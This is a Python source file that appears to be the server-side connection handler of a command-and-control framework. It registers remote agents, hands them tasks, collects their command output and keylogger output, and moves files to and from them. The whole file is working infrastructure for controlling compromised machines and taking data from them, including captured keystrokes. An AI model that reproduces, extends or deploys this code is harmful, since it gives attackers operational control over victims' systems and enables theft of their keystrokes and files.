import socket
from .command_processor import CommandProcessor
from .file_transfer import FileTransferService

class ConnectionHandler:
    """Handles network connections and routes commands"""
    def __init__(self, command_processor: CommandProcessor, 
                 file_transfer_service: FileTransferService,
                 buffer_size: int):
        self.command_processor = command_processor
        self.file_transfer_service = file_transfer_service
        self.buffer_size = buffer_size
        self.single_transaction_commands = {
            "register", "request_action", "checkin", "command_output", "keylogger_output"
        }

    def handle_connection(self, sock: socket.socket, client_address: tuple):
        """Main connection handler that routes to appropriate processors"""
        from utils import logger  # Import here to avoid circular imports
        try:
            sock.settimeout(5.0)  # 5 second timeout for initial message
            initial_data = sock.recv(self.buffer_size).decode('utf-8').strip()
            if not initial_data:
                return

            parts = initial_data.split('|')
            command = parts[0] if parts else ""

            if command in ("to_agent", "from_agent"):
                self._handle_file_transfer(sock, command, parts)
            else:
                self._handle_command(sock, initial_data, client_address)

        except Exception as e:
            logger.log_message(f"Connection Error: {client_address[0]}:{client_address[1]} - {str(e)}")
        finally:
            try:
                sock.close()
            except:
                pass
           # logger.log_message(f"Connection closed for {client_address}")

    def _handle_file_transfer(self, sock: socket.socket, command: str, parts: list):
        """Handle file transfer operations"""
        import utils  # Import here to avoid circular imports
        logger = utils.logger
            
        logger.log_message(f"Entering _handle_file_transfer with command: {command}")
        if len(parts) < 2:
            logger.log_message("Invalid file transfer command - missing parts")
            sock.send(b"ERROR|Invalid file transfer command")
            return

        filename = parts[1]
        logger.log_message(f"Processing file transfer for: {filename}")
        
        # We need to get config from somewhere - let's create a simple workaround
        from config import ServerConfig
        config = ServerConfig()
        
        if command == "to_agent":
            logger.log_message("Handling to_agent command")
            self.file_transfer_service.send_file(sock, filename, config, logger)
        else:  # from_agent
            logger.log_message("Handling from_agent command")
            try:
                logger.log_message("Sending READY signal")
                sock.send(b"READY")
                logger.log_message("READY signal sent, preparing to receive file")
                self.file_transfer_service.receive_file(sock, filename, config, logger)
            except Exception as e:
                logger.log_message(f"Error in from_agent handling: {str(e)}")

    def _handle_command(self, sock: socket.socket, initial_data: str, client_address: tuple):
        """Handle command processing"""
        import utils  # Import here to avoid circular imports
        try:
            keep_alive = self._process_command(sock, initial_data)
            if not keep_alive:
                return

            while True:
                try:
                    data = sock.recv(self.buffer_size).decode('utf-8').strip()
                    if not data:
                        break

                    keep_alive = self._process_command(sock, data)
                    if not keep_alive:
                        break

                except socket.timeout:
                    continue  # Keep connection alive on timeout
                except Exception as e:
                    if utils.logger:
                        utils.logger.log_message(f"Error processing command from {client_address}: {e}")
                    break

        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in command handler for {client_address}: {e}")

    def _process_command(self, sock: socket.socket, data: str) -> bool:
        """Process individual commands and return whether to keep connection alive"""
        import utils  # Import here to avoid circular imports
        if utils.logger:
            utils.logger.log_message(f"Received: {data}")
        parts = data.split('|')
        if not parts:
            sock.sendall(b"Invalid command format")
            return False
            
        command = parts[0]
        try:
            # Special handling for command output
            if command == "command_output" and len(parts) >= 2:
                agent_id = parts[1]
                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
                response = self.command_processor.process_command_output(agent_id, output)
            elif command == "keylogger_output" and len(parts) >= 2:
                agent_id = parts[1]
                output = data.split('|', 2)[2] if len(parts) > 2 else ""
                response = self.command_processor.process_keylogger_output(agent_id, output)
            else:
                # Command dispatch dictionary
                response = {
                    "register": lambda: self.command_processor.process_registration(
                        parts[1], parts[2]
                    ) if len(parts) == 3 else "Invalid registration format",
                    
                    "request_action": lambda: self.command_processor.process_action_request(
                        parts[1]
                    ) if len(parts) == 2 else "Invalid request format",
                    
                    "download_complete": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_complete"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "download_failed": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_failed"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "checkin": lambda: "Check-in acknowledged"
                        if len(parts) == 2 else "Invalid checkin format",
                }.get(command, lambda: "Unknown command")()
                
            sock.sendall(response.encode('utf-8'))
            return command not in self.single_transaction_commands
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing command {command}: {e}")
            return False